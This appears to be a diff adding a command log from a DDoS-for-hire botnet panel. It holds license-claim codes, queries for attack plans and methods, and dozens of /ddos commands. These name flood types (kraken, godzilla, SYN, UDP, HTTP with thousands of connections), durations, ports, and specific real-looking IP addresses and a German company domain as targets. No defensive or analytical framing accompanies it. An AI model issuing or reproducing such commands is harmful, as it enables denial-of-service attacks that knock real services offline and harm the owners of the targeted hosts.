@@ -1,0 +1,43 @@
+/claim TRIwWb2ZcbHAtDtkZYlyba9oS6dyMBela8zyZTipKOblvsrDNE
+/plans
+/plan
+/claim MOTHMa7UxyrHEpK56AMYLgiXaZr4YbU8Isj988nPYQj7n01vLW
+/methods
+/tr4p
+/info
+/ddos kraken std 78.46.155.238 120 80
+/ddos kraken squid 78.46.155.238 120 80
+/methods
+/ddos Kraken 51.255.9.40 120 3306
+/ddos kraken udpplain 51.255.9.40 120 3306
+/ddos kraken http holz-richter.de 120 holz-richter.de conns=500
+/ddos kraken http holz-richter.de 120 holz-richter.de conns=5000
+/ddos kraken http holz-richter.de 120 conns=5000
+/ddos kraken 78.46.155.238 120 holz-richter.de conns=5000
+/ddos kraken http 78.46.155.238 120 holz-richter.de conns=5000
+/methods
+/ddos std 128.65.209.74 120 3306
+/ddos kraken std 128.65.209.74 120 3306
+/ddos kraken std 78.46.155.238 120 80
+/tr4p
+/methods
+/ddos kraken std 78.46.155.238 80
+/ddos kraken squid 78.46.155.238 120 80
+/methods
+/ddos sync 78.46.155.238 120 3306
+/ddos godzilla syn 78.46.155.238 120 3306
+/ddos godzilla syn 128.65.209.74 120 3306
+/ddos godzilla syn 78.46.155.238 180 3306
+/tr4p
+/plan
+/methods
+/ddos godzilla syn 78.46.155.238 1200 3306
+/ddos godzilla vse 78.46.155.238 120 3306
+/ddos godzilla vse 51.89.48.65 120 30000
+/ddos godzilla vse 51.89.48.65 120 30000
+/ddos godzilla vse 51.89.48.65 120 30000
+/ddos godzilla vse 128.65.209.74 120 80
+/ddos godzilla vse 79.133.54.200 120 9987
+/methods
+/ddos kraken vse 78.46.155.238 1200 3306
+/ddos kraken vse 128.65.209.74 1200 3306
